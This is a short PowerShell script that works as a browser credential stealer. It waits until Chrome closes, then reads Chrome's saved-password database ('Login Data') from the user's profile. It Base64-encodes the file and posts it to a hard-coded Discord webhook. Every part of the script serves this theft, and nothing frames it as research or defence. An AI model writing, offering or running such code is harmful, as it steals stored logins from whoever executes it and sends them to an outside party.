# File path to Chrome Login Data
$filePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

# Your Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1374075895941169322/0q_M5862QHhmUHeIUIu9b0Y_L2feBqu-tbTz3gsbEiASX5HtOc8gwfh5fNMajSnbCrOq"

# Function to check for running Chrome processes
function Wait-ForChromeToClose {
    while ($true) {
        $chromeProcesses = Get-Process -Name chrome -ErrorAction SilentlyContinue
        if (!$chromeProcesses) {
            Write-Host "Chrome is closed. Proceeding..."
            break
        }
        else {
            Write-Host "Waiting for Chrome to close..."
            Start-Sleep -Seconds 5
        }
    }
}

# Call the wait function
Wait-ForChromeToClose

# Now read the file and convert to Base64
try {
    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $fileBase64 = [Convert]::ToBase64String($fileBytes)
} catch {
    Write-Host "Error reading file: $_"
    exit
}

# Create JSON payload for Discord webhook
$payload = @{
    content = "Base64 preview of Login Data:`n$fileBase64"
} | ConvertTo-Json -Depth 10

# Send to Discord webhook
try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
    Write-Host "File content sent to Discord webhook."
} catch {
    Write-Host "Error sending to webhook: $_"
}
